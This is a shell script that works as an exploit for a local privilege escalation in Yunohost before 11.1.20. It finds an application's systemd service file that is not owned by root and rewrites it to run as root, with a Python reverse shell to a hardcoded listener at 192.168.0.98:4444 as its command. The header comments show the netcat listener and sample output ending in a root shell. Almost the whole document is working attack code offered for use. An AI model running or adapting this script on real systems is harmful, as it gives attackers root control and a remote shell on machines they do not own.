#!/bin/sh
#
# A security vulnerability has been discovered in Yunohost version
# < 11.1.20, enabling a local privilege escalation attack. This vulnerability
# requires an initial remote code execution exploit to be successful. Exploiting
# the vulnerability allows an attacker with local access to execute arbitrary
# programs with root privileges by leveraging incorrect permissions on service
# files of installed applications.
#
# locally:
#
# 	$ nc -nlvp 4444
#
# target:
#
# 	$ whoami
# 	adguardhome
# 	$ ./exploit.sh
# 	[*] Checking if exploitable
# 	/etc/systemd/system/adguardhome.service
# 	[*] exploitable!
# 	[*] backing up service file to /var/tmp/adguardhome.service
# 	[*] hijacking /etc/systemd/system/adguardhome.service
# 	[*] to restore original service file: cp "/var/tmp/adguardhome.service" "/etc/systemd/system/adguardhome.service"
# 	[*] service hijacked, when the system is rebooted or 'systemctl-daemon reload; systemctl restart adguardhome' is executed, $cmd will be run
#
# locally:
#
# 	# whoami
# 	root
#

set -eu

LHOST=192.168.0.98
LPORT=4444

_info() {
        printf '\e[34m\e[1m[*] %s\e[0m\n' "$*"
}

_error() {
        printf '\e[31m\e[1m[*] %s\e[0m\n' "$*"
}

_mainpid() {
        systemctl show --property MainPID --value "$user"
}

user="$(whoami)"
service_file="/etc/systemd/system/$user.service"
tmp_file="/var/tmp/$user.service"
cmd="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"

_info "Checking if exploitable"
if ! find "$service_file" ! -user root; then
        _error "not exploitable"
        exit 1
else
        _info "exploitable!"
fi

_info "backing up service file to $tmp_file"
if [ ! -f "$tmp_file" ]; then
        cp -v "$service_file" "$tmp_file"
fi

_info "hijacking $service_file"
sed 's#User=.*#User=root#g; s#Group=.*#Group=root#g; s#^ExecStart.*#ExecStart='"$cmd"'#' "$tmp_file" >"$service_file"

_info "to restore original service file: cp \"$tmp_file\" \"$service_file\""
_info "service hijacked, when the system is rebooted or 'systemctl-daemon reload; systemctl restart $user' is executed, \$cmd will be run"
